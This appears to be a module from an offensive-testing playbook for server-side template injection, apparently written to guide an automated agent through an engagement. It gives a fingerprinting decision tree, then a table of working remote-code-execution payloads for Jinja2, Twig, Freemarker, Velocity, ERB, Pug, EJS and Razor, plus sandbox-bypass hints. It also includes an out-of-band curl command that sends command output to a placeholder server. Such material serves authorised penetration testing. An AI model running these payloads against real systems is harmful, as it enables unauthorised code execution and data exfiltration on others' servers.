# Web And API Operations: Attack Primitives: Traditional Web Vulnerabilities: Server-Side Template Injection

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### Server-Side Template Injection — Engine-Aware Decision

SSTI is an injection into a server-side template engine. Do not cycle through generic `{{7*7}}` payloads — fingerprint the engine first, then choose the exploitation path specific to that engine. Different engines have entirely different RCE chains.

### Decision Entry

Load this scene when:
- [FACT] User input is reflected in a template-rendered output (email template preview, report generation, personalized page, error message with user content)
- [FACT] Expression syntax is evaluated server-side (`{{...}}`, `${...}`, `#{...}`, `<%= ... %>`)
- [INFERENCE] The observed stack (Python/Jinja2, Java/Freemarker, PHP/Twig, Node.js/EJS, Ruby/ERB) suggests a template engine is in use

Do not load for: client-side template rendering (Angular, Vue, React JSX), harmless string interpolation that doesn't evaluate expressions.

### Attack Progression Decision Tree

```
1. Confirm template evaluation (not just string interpolation)
   ├─ Inject {{7*7}} or ${7*7} → output is 49 (not literal "{{7*7}}") → SSTI confirmed
   ├─ Output is literal {{7*7}} → either the wrong syntax, or not a template engine
   └─ Output is empty/error → the expression caused a server error → SSTI likely, but confirmation needed

2. Fingerprint the engine (before crafting any RCE payload)
   │
   ├─ Python stack → test Jinja2 ({{ }}), Mako (${ }), Django (bracket-only in older versions)
   │   ├─ Jinja2: {{config}}, {{self.__class__}}; for object introspection use {{lipsum.__globals__}} or {{''.__class__.__mro__[-1].__subclasses__()}} (MRO index varies by Python version — use -1 to reference `object`)
   │   └─ Mako: ${self}, ${dir()}, ${self.module.cache.__class__}
   │
   ├─ Java stack → test Freemarker (${ }), Velocity (#), Thymeleaf (th:text)
   │   ├─ Freemarker: ${.data_model}, ${product} — RCE paths vary by version and configuration
   │   └─ Velocity: #set($x=7*7), #set($s="")$s.getClass().forName("java.lang.Runtime")
   │
   ├─ PHP stack → test Twig ({{ }}), Smarty ({ }), Blade ({{ }} — but Blade auto-escapes)
   │   ├─ Twig: {{_self}}; RCE via registerUndefinedFilterCallback depends on Twig version and sandbox
   │   └─ Smarty: {7*7}, {system('id')} only if {system} is registered as a function
   │
   ├─ Node.js stack → test Pug (#{ }), EJS (<%= %>), Handlebars ({{ }}), Nunjucks ({{ }})
   │   ├─ Pug: #{7*7}, #{global.process...} — requires the app to explicitly evaluate user input as template source
   │   ├─ EJS: <%= 7*7 %> — requires user input to reach the EJS render path with eval enabled
   │   └─ Handlebars: {{7*7}} outputs "7*7" literally by default (not evaluated as arithmetic). RCE requires a registered helper or precompiled template injection — Handlebars is logic-less by design, treat {{7*7}} not evaluating as normal behavior
   │
   ├─ Ruby stack → test ERB (<%= %>), Slim (=)
   │   └─ ERB: <%= 7*7 %>, <%= system('id') %>
   │
   └─ .NET stack → test Razor (@{ }), Scriban ({{ }})
       └─ Razor: @(7*7) only if user input is recompiled as Razor — template existence alone is not a vulnerability; the user input must reach the Razor compilation pipeline

3. Before attempting RCE — prove the engine's accessible object model (proof gradient)
   ├─ Step A: confirm expression evaluation → {{7*7}} or equivalent returns computed result (not literal)
   ├─ Step B: identify accessible objects → enumerate attributes/globals/filters available in the template context
   │   ├─ Jinja2: {{config}}, {{self}}, {{lipsum.__globals__}} — what is accessible to the template?
   │   ├─ Twig: {{_self}}, {{dump()}} — what environment objects are exposed?
   │   └─ Freemarker: ${.data_model?keys} — what data model objects exist?
   ├─ Step C: read-only proof → read a file or environment variable that proves server-side access without altering state
   │   └─ e.g., {{lipsum.__globals__.__builtins__.open('/etc/hostname').read()}} or engine equivalent
   ├─ Step D: bounded command execution → single id/whoami/hostname command with observation of output
   └─ Only progress to Step D when Steps A-C confirm the engine, version, and accessible objects support RCE. A failure at Step B does not mean the engine is safe — it may mean a different injection path or sandbox escape is required

4. Build RCE chain (engine-specific, not generic — use only after proof gradient confirmed the path)
   ├─ Python/Jinja2: if __globals__ is accessible via lipsum or cycler → os.popen or subprocess.Popen
   ├─ Java/Freemarker: if Execute utility is on the classpath and accessible → instantiate Execute
   ├─ PHP/Twig: if registerUndefinedFilterCallback exists and exec is callable → register filter + trigger
   ├─ Node.js: if process.mainModule is reachable via constructor chain → require child_process
   └─ Ruby/ERB: if system() or backtick execution are available → direct command

5. If engine fingerprint is ambiguous
   ├─ Test the most restrictive syntax first (each engine ignores syntax it doesn't understand)
   ├─ A syntax error may leak the engine name in the error message
   └─ Test engines sequentially, changing only the syntax variable per attempt — do not test multiple engines in parallel payloads as this confuses which change produced the result
```

### Engine RCE Quick Reference

| Engine (Language) | Detection | RCE Entry Point |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` → 49 | `{{lipsum.__globals__.os.popen('id').read()}}` or traverse `__class__.__mro__[-1].__subclasses__()` to locate Popen |
| Twig (PHP) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` — version-dependent |
| Freemarker (Java) | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` — Execute class availability varies by version |
| Velocity (Java) | `#set($x=7*7)$x` → 49 | Velocity RCE requires `Runtime.getRuntime().exec()` via reflection — the chain is version and configuration specific. The expression `'x'.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')` is one possible path, but availability depends on Velocity version and property restrictions |
| Smarty (PHP) | `{7*7}` → 49 | `{system('id')}` only if {system} is registered as a Smarty function |
| ERB (Ruby) | `<%= 7*7 %>` → 49 | `<%= system('id') %>` or `<%= IO.popen('id').read %>` |
| Pug (Node.js) | `#{7*7}` → 49 | `#{global.process.mainModule.require('child_process').execSync('id')}` — requires user input in template source, not just data |
| EJS (Node.js) | `<%= 7*7 %>` → 49 | `<%= process.mainModule.require('child_process').execSync('id') %>` — requires eval or user-input in render path |
| Handlebars (Node.js) | `{{7*7}}` outputs literal "7*7" by default — Handlebars is logic-less | RCE requires: a registered helper that evaluates expressions, or precompiled template injection. `{{7*7}}` not computing is normal Handlebars behavior, not a defense |
| Razor (.NET) | `@(7*7)` → 49 only if user input reaches Razor compilation | `@System.Diagnostics.Process.Start("cmd.exe","/c whoami")` — requires recompilation of user input, not just template rendering of data |

### Failure Branches

| Failure Signal | Likely Cause | Next Variable |
|---|---|---|
| Expression reflected literally (output is `{{7*7}}`) | Not a template engine, or the syntax is wrong for this engine | Change engine syntax: try `${7*7}`, `#{7*7}`, `<%= 7*7 %>`; or the parameter is not template-processed at all — recheck the injection point |
| Expression causes error but no output difference | Template engine caught the error; sandbox mode enabled; output encoding hides the result | Test expressions that do not throw (attribute access, simple math); test blind SSTI via a timing primitive derived from objects confirmed accessible in Step B — sleep/timeout primitives are engine-specific and context-dependent, not universal (`sleep` may not exist in every engine context). If no timing primitive is accessible from the confirmed object scope, the blind SSTI path is uncertain: park with the confirmed object scope recorded |
| RCE chain fails, class/function not found | The engine version, configuration, or sandbox differs from the chain's expected environment; RCE chains are version-specific, not universal | Go back to proof gradient Step B: enumerate what objects ARE accessible rather than cycling through chains. A chain that worked in a blog post may not apply to this deployment. If accessible objects cannot reach exec/shell → park the RCE path and test: can the template engine's own features (file include, URL fetch, data export) be abused for information disclosure? |
| Sandbox is active (restricted context, no `__class__`, no `import`) | The application uses a sandboxed template environment | Jinja2 SandboxedEnvironment: try format-string-based bypass; test built-in filters for side effects; if sandbox is robust, park and test other injection surfaces — SSTI sandbox escapes are time-intensive and often patched |
| RCE confirmed but output not visible (blind SSTI) | The command output is not rendered in the response | Use out-of-band: `curl http://your-server/$(id\|base64)`; or write output to a web-accessible path and fetch; or use timing (`sleep`) as confirmation |

## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.
